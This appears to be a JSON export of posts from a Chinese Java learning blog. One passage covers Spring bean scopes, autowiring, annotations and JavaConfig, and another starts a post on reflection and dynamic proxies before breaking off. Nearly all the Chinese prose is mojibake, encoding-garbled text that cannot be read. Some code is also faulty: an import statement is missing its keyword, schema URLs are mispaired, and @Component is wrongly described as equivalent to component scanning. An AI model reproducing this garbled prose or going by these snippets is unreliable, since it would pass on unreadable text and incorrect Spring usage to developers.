p:name=&quot;æœˆæ›œ&quot;/&gt;&lt;bean id=&quot;user3&quot; class=&quot;com.ys.pojo.User&quot; c:age=&quot;21&quot; c:name=&quot;æœˆç¬™&quot;/&gt; 1234567891011@Testpublic void test()&#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;bean2.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user2&quot;, User.class); System.out.println(user); System.out.println(user2); User user3 = context.getBean(&quot;user3&quot;, User.class); System.out.println(user3); ï¼ˆæƒ³ä½¿ç”¨testè®°å¾—å¯¼å…¥junitå“¦ ç›¸åŒçš„ï¼Œä½¿ç”¨cæ ‡ç­¾å°±ç›¸å½“äºä½¿ç”¨æ„é€ å™¨å‘¢ã€‚ é‚£ä¹ˆç©ä»€ä¹ˆè¦ä½¿ç”¨cæ ‡ç­¾å’Œpæ ‡ç­¾å‘¢ï¼Ÿ æˆ‘çŒœæƒ³æ˜¯å¦‚æœæˆ‘ä»¬å¯¹è¿™ç§ç®€å•çš„æ³¨å…¥æ–¹å¼ç»Ÿä¸€çš„ä½¿ç”¨æ ‡ç­¾æ¥è¿›è¡Œæ³¨å…¥ï¼Œè€Œå¤æ‚çš„ä½¿ç”¨propæ¥è¿›è¡Œæ³¨å…¥ï¼Œå¯ä»¥ç®€åŒ–æˆ‘ä»¬çš„ä»£ç ï¼Œå½“xmlç¹ççš„æ—¶å€™ä¹Ÿä¸è‡³äºä¸€å¡Œç³Šæ¶‚äº†æŠŠ å®˜æ–¹æ–‡æ¡£ï¼š namespace is not as flexible as the standard XML format. For example, the format for declaring property references clashes with properties that end in Ref, whereas the standard XML format does not. We recommend that you choose your approach carefully and communicate this to your team members, to avoid producing XML documents that use all three approaches at the same time. æ„æ€æ˜¯ä¸å¤Ÿçµæ´»ï¼ŒåŒæ—¶éœ€è¦ä¸å›¢é˜Ÿæ²Ÿé€šå¥½ï¼Œä½†æ˜¯å¯ä»¥ç®€åŒ–ä»£ç ï¼Ÿ 5 Beançš„ä½œç”¨åŸŸä¸»è¦æ˜¯æ¢è®¨åŸå‹å’Œå•ä¾‹ä¹‹é—´çš„å·®è·ï¼š å•ä¾‹ï¼š ä¹‹åæˆ‘ä»¬åˆ›å»ºçš„æ—¶å€™å³ä½¿åˆ›å»ºå¾ˆå¤šä¸ªç±»ï¼Œä¾ç„¶åªæœ‰ä¸€ä¸ªåŸå‹ å¤šä¾‹ï¼š æ¯åˆ›å»ºä¸€ä¸ªæ–°çš„ç±»éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„ç±» 12&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;prototype&quot;&#x2F;&gt;&lt;bean class&#x3D;&quot;com.ys.pojo.User&quot; id&#x3D;&quot;user2&quot; p:age&#x3D;&quot;20&quot; p:name&#x3D;&quot;æœˆæ›œ&quot; scope&#x3D;&quot;singleton&quot;&#x2F;&gt; æµ‹è¯•ä»£ç ï¼š 12345User user = context.getBean(&quot;user&quot;, User.class); User user2 = context.getBean(&quot;user&quot;, User.class); System.out.println(user.hashCode()); System.out.println(user2.hashCode()); System.out.println(user==user2); å¾—åˆ°ç»“æœï¼š 1231075738627282828951false 6. Beançš„è‡ªåŠ¨è£…é… è‡ªåŠ¨è£…é…æ˜¯Springæ»¡è¶³beanä¾èµ–çš„ä¸€ç§æ–¹å¼ï¼ Springä¼šåœ¨ä¸Šä¸‹æ–‡ä¸­è‡ªåŠ¨å¯»æ‰¾ï¼Œå¹¶è‡ªåŠ¨ç»™beanè£…é…å±æ€§ åœ¨Springä¸­æœ‰ä¸‰ç§è‡ªåŠ¨è£…é…çš„æ–¹å¼ï¼š åœ¨XMLä¸­æ˜¾å¼çš„é…ç½® åœ¨Javaä¸­æ˜¾å¼çš„é…ç½® éšå¼çš„è‡ªåŠ¨è£…é…beanã€é‡è¦ã€‘ 6.1 æµ‹è¯•ç¯å¢ƒ ä¸€ä¸ªäººæœ‰ä¸¤æ¡ç‹—ï¼ Catï¼š 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;miao&quot;); &#125;&#125; Dogï¼š 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;wang&quot;); &#125;&#125; Personï¼š 1234567891011121314151617181920212223242526272829303132333435363738public class Person &#123; private Cat cat; private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; beans.xml: byNameé…ç½®ï¼š 123456&lt;bean id=&quot;cat&quot; class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean id=&quot;dog&quot; class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; byTypeï¼š 123456&lt;bean class=&quot;com.ys.pojo.Cat&quot;/&gt;&lt;bean class=&quot;com.ys.pojo.Dog&quot;/&gt;&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byType&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; byNameå°±æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å¯»æ‰¾idå’Œæ‰€éœ€æ±‚åŒ¹é…çš„å€¼ï¼Œè€ŒbyTypeåˆ™æ˜¯åœ¨ä¸Šä¸‹æ–‡ä¸­å»å¯»æ‰¾å’Œç±»å‹ç›¸åŒç±» äºæ˜¯æˆ‘åˆäº§ç”Ÿäº†ä¸€ä¸ªç–‘æƒ‘ï¼Œå¦‚æœå­˜åœ¨è·¨æ–‡ä»¶çš„æƒ…å†µå‘¢ï¼Ÿ äºæ˜¯æˆ‘åˆåˆ›å»ºäº†ä¸€ä¸ªbean1.xmlæ¥å‚¨å­˜ 123&lt;bean id=&quot;person&quot; class=&quot;com.ys.pojo.Person&quot; autowire=&quot;byName&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;dnm&quot;/&gt;&lt;/bean&gt; å¾—åˆ°ç»“æœï¼š æœˆçŸ³ miao wang ä½†æ˜¯å¦‚æœæˆ‘æŠŠbeansçš„æ³¨é‡Šä¹‹åå‘¢ åˆ™æ˜¯ dnm miao wang è¿™å°±è¯´æ˜ï¼Œå½“æˆ‘ä»¬ä½¿ç”¨beans.xmlè£…é…ä¹‹åï¼Œç³»ç»Ÿä¼šä¼˜å…ˆåœ¨å½“å‰xmlæ¥è¿›è¡ŒæŸ¥æ‰¾ï¼Œä¹‹åæ‰ä¼šå»å…¶ä»–åœ°æ–¹æŸ¥æ‰¾ é™¤æ­¤ä¹‹å¤–æˆ‘ä»¬éœ€è¦è®°ä½ï¼š å½“æˆ‘ä»¬ä½¿ç”¨byNameçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„idå”¯ä¸€ä¸”æ­£ç¡® å½“æˆ‘ä»¬ä½¿ç”¨byTypeçš„æ—¶å€™ï¼Œå¿…é¡»ä¿è¯å½“å‰beançš„classå”¯ä¸€ä¸”æ­£ç¡® 6.2ä½¿ç”¨æ³¨è§£å®ç°è‡ªåŠ¨è£…é…jdk1.5æ”¯æŒï¼Œspring2.5æ”¯æŒ ä½¿ç”¨æ³¨è§£é¡»çŸ¥ï¼š å¯¼å…¥çº¦æŸ é…ç½®æ³¨è§£çš„æ”¯æŒ å¿…é¡»å¯¼å…¥å¦‚ä¸‹é…ç½®ï¼š 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; ä¹‹åæˆ‘ä»¬ä¾¿å¯ä»¥å¯¹å•ä¸ªå€¼è¿›è¡Œæ³¨å…¥ã€‚ åœ¨Personç±»å½“ä¸­ï¼š 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.ys.pojo;import org.springframework.beans.factory.annotation.Autowired;public class Person &#123; @Autowired private Cat cat; @Autowired private Dog dog; private String name; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; @Override public String toString() &#123; return &quot;Person&#123;&quot; + &quot;cat=&quot; + cat + &quot;, dog=&quot; + dog + &quot;, name=&#x27;&quot; + name + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; å½“æˆ‘ä»¬ä½¿ç”¨atuowiredæ³¨å…¥ä¹‹åï¼Œç”šè‡³è¿setæ–¹æ³•éƒ½ä¸éœ€è¦æ„é€ äº†ï¼Œä¸ºä»€ä¹ˆå‘¢ï¼Ÿ ã€æ®è¯´æ˜¯å› ä¸ºä»–åˆ©ç”¨åå°„çš„æ–¹å¼è·å–ä»£ç ï¼Œæˆ‘ä¹Ÿä¸æ˜¯å¾ˆæ‡‚ å¦‚æœbeanå½“ä¸­çš„é…ç½®å¤šèµ·æ¥äº†ï¼Œæˆ‘ä»¬æƒ³æ„é€ çš„è¯ï¼Œå°±éœ€è¦é€šè¿‡ 1@Qualifier(value = &quot;cat&quot;) æ˜¾å¼çš„å®šä¹‰ä»£ç  7.æ³¨è§£å¼€å‘åœ¨Spring4ä¹‹åï¼Œæˆ‘ä»¬å¿…é¡»ä¿è¯Springçš„AOPåŒ…è¢«å¯¼å…¥ åœ¨ä½¿ç”¨æ³¨è§£çš„æ—¶å€™éœ€è¦å¯¼å…¥contextçº¦æŸï¼Œå¢åŠ æ³¨è§£çš„æ”¯æŒ 123456789&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:context=&quot;http://www.springframework.org/schema/context&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans http://springframework.org/schema/context http://springframework.org/schema/context/spring-context.xsd https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;context:annotation-config/&gt; bean å½“æˆ‘ä»¬ä½¿ç”¨æ³¨è§£ä¹‹åï¼Œbeanå¯ä»¥å¦‚ä¸‹æ–¹æ³•è¿›å…¥å¯¼å…¥ï¼š ç¬¬ä¸€æ­¥ï¼Œå¯¼å…¥åŒ…ï¼š 12&lt;context:annotation-config/&gt;&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; ç¬¬äºŒæ­¥ï¼Œå»ç±»çš„ä¸Šé¢æ·»åŠ æ³¨é‡Šï¼š 12345678910111213@Componentpublic class User &#123; private String name; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125;&#125; æ³¨æ„@Componentï¼Œè¿™ä¸ªæ³¨è§£çš„æ„æ€ç­‰ä»·äº 1&lt;bean id=&#x27;user&#x27; class=com.ys.pojo.user&gt; å±æ€§å¦‚ä½•æ³¨å…¥ ä½¿ç”¨ç±»æˆ‘ä»¬ä¹Ÿæ˜¯å¯ä»¥æ³¨å…¥å€¼çš„ï¼š 123public class User &#123; @Value(&quot;æœˆçŸ³&quot;) private String name; ç­‰ä»·äºï¼š 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; ä½†æ˜¯é€šè¿‡è¿™æˆ‘ä»¬å°±å¯ä»¥æ˜ç™½ï¼Œæ³¨è§£æ³¨å…¥å€¼ä¸é€‚åˆæ³¨å…¥å¤æ‚ç±»å‹çš„å€¼ã€‚ è¡ç”Ÿçš„æ³¨è§£ é€šè¿‡@Componentåé¢ä¸ºäº†åˆ†å±‚ï¼Œæˆ‘ä»¬è¡ç”Ÿå‡ºäº†å¦‚ä¸‹æ³¨è§£ï¼š Dao: @Repository Service: @Service Controller: @Controller è¿™å››ä¸ªç±»çš„æœ¬è´¨éƒ½æ²¡æœ‰åŒºåˆ«ï¼Œéƒ½ä»£è¡¨æ³¨å†Œä¸€ä¸ªbeanå»XMLå½“ä¸­ï¼Œåªä¸è¿‡è¿™æ ·å†™å¯ä»¥ä½¿å¾—æˆ‘ä»¬MVCæ¶æ„æ›´åŠ æ¸…æ™°æ˜äº† è‡ªåŠ¨è£…é… 123- @Atuowired: è‡ªåŠ¨è£…é…- @Nullableï¼š å…è®¸å­—æ®µä¸ºnull- @Resource ï¼šé€šè¿‡åå­—ï¼Œç±»å‹è‡ªåŠ¨è£…é… ä½œç”¨åŸŸ å…¶å®é€šè¿‡æ³¨è§£ä¹Ÿå¯ä»¥å¯¹ä½œç”¨åŸŸè¿›è¡Œæ³¨è§£ï¼Œä½†æ˜¯æˆ‘è§‰å¾—ä¸æ˜¯å¾ˆæ–¹ä¾¿ã€‚ 1@Scope() ä¸ºä»€ä¹ˆä¸é€šè¿‡XMLå‘¢ï¼Ÿ å°ç»“ åœ¨è¿™ç« æˆ‘ä»¬å­¦ä¼šäº†åˆ©ç”¨æ³¨è§£è¿›è¡Œå¼€å‘ï¼Œå¯ä»¥é€šè¿‡æ³¨è§£æ‘†è„±XMLï¼Œä½†æ˜¯æˆ‘é€šè¿‡å­¦ä¹ è¿™ä¸€ç« èŠ‚ï¼Œæˆ‘æ„Ÿè§‰Springæ­¤æ—¶è¿˜æ˜¯ä¸å¤Ÿæˆç†Ÿï¼Œå¤§éƒ¨åˆ†çš„æ—¶å€™è¿˜æ˜¯åˆ©ç”¨XMLæ›´åŠ æ–¹ä¾¿ï¼Œå¤æ‚çš„ä¸œè¥¿ä¸¢ç»™XMLæ¥åšï¼Œç®€å•çš„åˆ©ç”¨æ³¨è§£æ³¨å…¥å°±è¡Œ æ‰€ä»¥æœ€ä½³å®è·µåº”è¯¥æ˜¯ï¼š åˆ©ç”¨XMLæ‰‹åŠ¨çš„å»ºç«‹æ¯ä¸ªbeanï¼Œè¿™æ ·æ–¹ä¾¿ç¨‹åºå‘˜çš„äº’ç›¸åˆä½œ XMLæ³¨å…¥MAPç±»å‹ç­‰ åˆ©ç”¨æ³¨é‡Šæ‰‹åŠ¨çš„æ³¨å…¥ç®€å•å€¼ï¼Œé™ä½å¼€å‘æˆæœ¬ åŒæ—¶æˆ‘ä»¬è¿˜éœ€è¦äº†è§£ï¼š XMLçš„ä¼˜åŠ¿å°±åœ¨äºä»–æ›´åŠ æ¸…æ¥šæ˜äº†ï¼Œèµ·ç åœ¨Springæ¥è¯´æ˜¯è¿™æ ·çš„ï¼ŒåŒæ—¶XMLè¿˜æ–¹ä¾¿è·¨æ–‡ä»¶é…åˆ è€Œæ³¨è§£æ›´åŠ çš„æ–¹ä¾¿æˆ‘ä»¬è¿›è¡Œå¼€å‘ï¼Œæ³¨å…¥å€¼ï¼Œé™ä½ç¨‹åºå‘˜çš„æˆæœ¬ï¼ˆä½†æ˜¯å¢åŠ äº†è¿ç»´çš„éš¾åº¦ ä½¿ç”¨æ³¨è§£å¼€å‘çš„ä¸€ä¸ªç®€å•ä¾‹å­ï¼Œè¿˜æ˜¯ä¸€ä¸ªäººä¸¤ä¸ªå® ç‰©ï¼š ğŸ±çš„ä»£ç ï¼š 12345678910package com.ys.pojo;import org.springframework.stereotype.Component;@Componentpublic class Cat &#123; public void shout()&#123; System.out.println(&quot;ğŸ±ï¼šwdnmd&quot;); &#125;&#125; ğŸ•çš„ä»£ç ï¼š 12345678910package com.ys.pojo;org.springframework.stereotype.Component;@Componentpublic class Dog &#123; public void shout()&#123; System.out.println(&quot;ğŸ•ï¼šwdnmd&quot;); &#125;&#125; äººçš„ä»£ç ï¼š 1234567891011121314151617181920212223242526272829303132@Componentpublic class User &#123; @Value(&quot;æœˆçŸ³&quot;) private String name; @Autowired private Cat cat; @Autowired private Dog dog; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public Cat getCat() &#123; return cat; &#125; public void setCat(Cat cat) &#123; this.cat = cat; &#125; public Dog getDog() &#123; return dog; &#125; public void setDog(Dog dog) &#123; this.dog = dog; &#125;&#125; æµ‹è¯•ä»£ç ï¼š 1234567891011public class Mytest &#123; public static void main(String[] args) &#123; ClassPathXmlApplicationContext context = new ClassPathXmlApplicationContext(&quot;beans.xml&quot;); User user = context.getBean(&quot;user&quot;, User.class); System.out.println(user.getName()); user.getCat().shout(); user.getDog().shout(); &#125;&#125; ä¾ç„¶èƒ½å¤Ÿæ­£å¸¸çš„å¾—åˆ°ç»“æœ~ 8 å®Œå…¨ä½¿ç”¨Javaé…ç½®Springæˆ‘ä»¬ç°åœ¨è¦å®Œå…¨ä½¿ç”¨Javaconfigå®Œå…¨çš„ä»£æ›¿XMLäº†ï¼ŒSpringBootå½“ä¸­ä¹Ÿæ˜¯è¿™æ ·åšçš„ï¼Œæˆ‘è¿˜æ˜¯æœ‰ç‚¹æ…Œï¼Œæ„Ÿè§‰æ²¡æœ‰èƒ½å¤Ÿé€‚åº”è¿‡æ¥ è¿˜æ˜¯å¾ˆæœ‰å¿…è¦å°†XMLçš„æ–¹å¼å’ŒJavaç±»çš„æ–¹å¼è¿›è¡Œå¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦ä½¿ç”¨Javaconfigæ¥ä»£æ›¿XML æ„é€ å¦‚ä¸‹Javaä»£ç : 123456789@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125;&#125; æˆ‘ä»¬ä½¿ç”¨@Configurationçš„æ„æ€ç­‰åŒäºï¼š 1&lt;beans &gt;&lt;/beans&gt; ä¹‹åæˆ‘ä»¬æ‰€æœ‰çš„é…ç½®éƒ½å¯ä»¥å†™åœ¨è¯¥ç±»å½“ä¸­ @Component(â€œcom.ys.pojoâ€)ç±»ç­‰åŒäºå¦‚ä¸‹ä»£ç ï¼š 1&lt;context:component-scan base-package=&quot;com.ys&quot;/&gt; å°†ä¸¤è€…ä¹‹é—´è¿›è¡Œè¿›ä¸€æ­¥çš„å¯¹æ¯”ï¼Œå¦‚æœæˆ‘ä»¬æƒ³è¦é…ç½®ä¸€ä¸ªç±»çš„è¯ï¼š 1&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;/&gt; è¿™ä¸ªXMLæ ‡ç­¾ç­‰åŒäºï¼š 1234@Beanpublic User user()&#123; return new User();&#125; é‚£å¦‚ä½•æ³¨å…¥å€¼å‘¢ï¼Ÿ åœ¨XMLå½“ä¸­æˆ‘ä»¬æ˜¯è¿™æ ·æ“ä½œçš„ï¼š 123&lt;bean id=&quot;user&quot; class=&quot;com.ys.pojo.User&quot;&gt; &lt;property name=&quot;name&quot; value=&quot;æœˆçŸ³&quot;/&gt;&lt;/bean&gt; è€Œåˆ°äº†Javaconfigä¹‹ä¸­ï¼š 123public class User &#123; @Value(&quot;æœˆçŸ³&quot;) public String name; æˆ‘ä»¬é€‰æ‹©ç›´æ¥ç”±ç±»æ¥æ³¨å…¥å€¼ï¼ è€ŒAutowiredä¾ç„¶æ²¡æœ‰å˜åŒ–ï¼Œè¿˜æ˜¯ç›´æ¥åœ¨åŒ…ä¸­å¯»æ‰¾ä¸Šä¸‹æ–‡çš„ç±»~ï¼Œæ¯”å¦‚æˆ‘ä»¬å°è¯•ç»§ç»­å­¦ä¹ ä¸¾ä¾‹ï¼Œä¸€ä¸ªäººæœ‰ä¸€åªçŒ«å’Œä¸€ä¸ªç‹—: 12345public class Cat &#123; public void shout()&#123; System.out.println(&quot;ğŸ±è¯´ï¼šwdnmdb&quot;); &#125;&#125; 12345public class Dog &#123; public void shout()&#123; System.out.println(&quot;ğŸ•è¯´ï¼šwndmd&quot;); &#125;&#125; å½“æˆ‘ä»¬ä½¿ç”¨è¿™ç§æ–¹å¼æ¥åˆ›å»ºä¹‹åï¼Œå°±æ²¡æœ‰åœ°æ–¹æ¥ä½¿ç”¨@Componentè¿™ä¸ªæ³¨è§£äº†ï¼Œå› ä¸ºæˆ‘ä»¬æ²¡æœ‰XMLå‘¢ï¼Ÿ æ€»è€Œè¨€ä¹‹æˆ‘å¿…é¡»ä¸åšå‡ºè¿™æ ·çš„JavaConfigä»£ç ï¼š 123456789101112131415161718@Configuration@Component(&quot;com.ys.pojo&quot;)@Import(JavaConfig2.class)public class JavaConfig &#123; @Bean public User user()&#123; return new User(); &#125; @Bean public Cat cat()&#123; return new Cat(); &#125; @Bean public Dog dog()&#123; return new Dog(); &#125;&#125; è€Œæˆ‘ä»¬çš„@Componentå°±æ²¡æœ‰ä»€ä¹ˆç”¨æ­¦ä¹‹åœ°äº†..","categories":[],"tags":[{"name":"å¼€å‘","slug":"å¼€å‘","permalink":"http://example.com/tags/%E5%BC%80%E5%8F%91/"}]},{"title":"JavaåŠ¨æ€ä»£ç†","slug":"JavaåŠ¨æ€ä»£ç†","date":"2020-11-10T11:42:16.000Z","updated":"2020-11-10T12:50:37.496Z","comments":true,"path":"2020/11/10/JavaåŠ¨æ€ä»£ç†/","link":"","permalink":"http://example.com/2020/11/10/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/","excerpt":"","text":"JavaåŠ¨æ€ä»£ç†å†å½“å‰çš„Javaä»£ç ä¸­å‡ ä¹éšå¤„å¯è§ï¼Œå› ä¸ºå®ƒæ—¢å¯ä»¥è·å–Javaé™æ€ä»£ç†çš„å¯æ‹“å±•æ€§ï¼Œå¹¶ä¸”å®ƒä¹Ÿå¯ä»¥è®©æˆ‘ä»¬çš„ä»£ç å˜å¾—å¹¶ä¸ç¹çï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œæ­£æ˜¯ç”±äºJavaçš„åŠ¨æ€ä»£ç†åŸç†æ˜¯åå°„ï¼Œæ•…è¿˜ä¼šå¼•å‡ºå¾ˆå¤šå®‰å…¨é—®é¢˜ï¼Œæˆ‘ä»¬è¦çŸ¥é“ï¼ŒJavaçš„åå°„æœ¬èº«å°±æ˜¯ä¸å®‰å…¨çš„ä¸€ä»¶äº‹ï¼ˆPrivateé¦–å…ˆå°±å˜å¾—æ¯«æ— æ„ä¹‰äº†ï¼‰ è¯è¯´å›æ¥ï¼Œæƒ³è¦å­¦ä¹ å¥½åŠ¨æ€ä»£ç†ï¼Œåå°„çš„å­¦ä¹ æ˜¯å¿…ä¸å¯å…çš„ï¼Œå¦‚æœæ²¡æœ‰å­¦ä¹ è¿‡æˆ‘å»ºè®®å…ˆå­¦ä¹ åå°„ï¼Œè¿™é‡Œå°†ä¸€äº›APIå†™ç½—åˆ—å‡ºæ¥ï¼Œæ–¹ä¾¿æ²¡æœ‰å­¦è¿‡åå°„ï¼Œæˆ–è€…å¯¹åå°„å¹¶ä¸ç†Ÿæ‚‰çš„è¯»è€…å¯ä»¥é˜…è¯»åé¢çš„æ–‡ç«  åå°„APIgetClass[ä¸€ä¸ªå®ä¾‹å¯¹è±¡].getClass ,å°†è¿”å›å®ä¾‹çš„ç±»ï¼Œæˆ‘è¿™é‡Œç”¨å¦‚ä¸‹ä»£ç è¿›è¡Œæ¼”ç¤ºï¼š ä¾‹å­ï¼š 123456789101112131415161718192021222324252627import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass()); &#125;;&#125;class myDemo&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;;&#125; å½“å‰ä»£ç çš„è¾“å‡ºç»“æœä¸ºï¼š æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šçš„å‘ç°ï¼Œè·å–äº†è¯¥å¯¹è±¡ getclass().getInterfaces()å…¶å®æˆ‘ä»¬è¯»åå­—ä¹Ÿå¯ä»¥å¾ˆæ¸…æ¥šçš„æ˜ç™½å®ƒçš„ç”¨é€”äº†ï¼Œç”¨äºè·å–å½“å‰çš„ç»§æ‰¿çš„æ¥å£ 1234567891011121314151617181920212223242526272829303132import org.apache.commons.collections.functors.ChainedTransformer;import java.io.ObjectInputStream;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getInterfaces()); &#125;;&#125;interface bark&#123; void jiao();&#125;class myDemo implements bark&#123; public String name = &quot;dasi&quot;; private String secretName = &quot;wuhu&quot;; public void jiao() &#123; System.out.println(&quot;jiao&quot;); &#125;&#125; è¿”å›ç»“æœä¸ºï¼š 1[Ljava.lang.Class;@7f31245a è¿™é‡Œä¾¿å¾—åˆ°äº†ç±»çš„æ¥å£äº†ï¼Œåªä¸è¿‡è¿™é‡Œæ˜¯ä»¥æµçš„æ–¹å¼è¿›è¡Œä¼ è¾“ getClass().getName()è¿™æ ·çš„ä¹Ÿå¾ˆç®€å•ç†è§£ï¼Œæˆ‘ä»¬å³ä½¿getClassäº†ï¼Œç¨‹åºå´ä¸çŸ¥é“å®ƒçš„åå­—ï¼Œç¨‹åºåªçŸ¥é“æ˜¯ä¸€ä¸ªç±»ï¼Œæ•…æˆ‘ä»¬ä½¿ç”¨getNameå³å¯å¾—åˆ°å½“å‰å®ä¾‹çš„ç±»çš„åå­—ï¼ˆStringå½¢å¼ï¼‰ 1234567public class Demo1 &#123; public static void main(String[] args) &#123; myDemo wdnmd = new myDemo();// System.out.println(myDemo); System.out.println(wdnmd.getClass().getName()); &#125;; å¥½åƒå†™ä¸€ä¸ªåŠ¨æ€ä»£ç†ä¹Ÿå°±ç”¨åˆ°äº†è¿™äº›ï¼Œå˜›ï¼Œç»§ç»­å¾€ä¸‹å§ åŠ¨æ€ä»£ç†2.1 æ¥å£é¦–å…ˆå’Œé™æ€ä»£ç†æ˜¯ä¸€æ ·çš„ï¼Œæˆ‘ä»¬ä¹Ÿéœ€è¦æ„ç­‘ä¸€ä¸ªæ¥å£ï¼š 123456789package myProxy2;public interface UserService &#123; public void add(); public void delete(); public void update(); public void query();&#125; åŒæ ·çš„ï¼Œä¸šåŠ¡å®ä½“æ˜¯ä¸å¯é¿å…çš„ 2.2å®ä½“ç±»ï¼š12345678910111213141516171819package myProxy2;public class UserServiceImp implements UserService &#123; public void add() &#123; System.out.println(&quot;å¢æ·»äº†ä¸€ä¸ªæ–°ç”¨æˆ·&quot;); &#125; public void delete() &#123; System.out.println(&quot;åˆ é™¤äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void update() &#123; System.out.println(&quot;æ›´æ–°äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125; public void query() &#123; System.out.println(&quot;æŸ¥è¯¢äº†ä¸€ä¸ªç”¨æˆ·&quot;); &#125;&#125; è€Œä»£ç†ç±»ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†æˆ‘ä»¬å¯ä»¥ç›´æ¥çš„ç”Ÿæˆï¼Œå–æ¶ˆç¹ççš„æ“ä½œ å¦‚æœç”¨é™æ€ä»£ç†ï¼Œæˆ‘ä»¬çš„ä»£ç†æ˜¯è¿™æ ·çš„ï¼š 12345678910111213141516171819202122232425262728293031323334package myProxy2;public class UserServiceProxy implements UserService &#123; private UserServiceImp userServiceImp; public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125; public void add() &#123; log(&quot;add&quot;); userServiceImp.add(); &#125; public void delete() &#123; log(&quot;åˆ é™¤&quot;); userServiceImp.delete(); &#125; public void update() &#123; log(&quot;æ›´æ–°&quot;); userServiceImp.update(); &#125; public void query() &#123; log(&quot;æŸ¥è¯¢&quot;); userServiceImp.query(); &#125; public void log(String name)&#123; System.out.println(&quot;[DEBUG]æ‰§è¡Œäº†&quot;+name+&quot;æ–¹æ³•&quot;); &#125;&#125; è€Œä½¿ç”¨åŠ¨æ€ä»£ç†ä¹‹åï¼š 2.3ä»£ç†ç±»123456789101112131415161718192021222324252627282930package Demo3;import myProxy2.UserServiceImp;import java.lang.reflect.InvocationHandler;import java.lang.reflect.Method;import java.lang.reflect.Proxy;public class ProxyInvocationHandler implements InvocationHandler &#123; private UserServiceImp userServiceImp;// IOCï¼Œè®©ç”¨æˆ·è‡ªå®šä¹‰éœ€è¦ä»€ä¹ˆæ¥å£æ¥å†³å®šä»£ç†ç±» public void setUserServiceImp(UserServiceImp userServiceImp) &#123; this.userServiceImp = userServiceImp; &#125;// ç”Ÿæˆä»£ç†ç±» public Object getProxy()&#123; return Proxy.newProxyInstance(this.getClass().getClassLoader(), userServiceImp.getClass().getInterfaces(),this); &#125; // 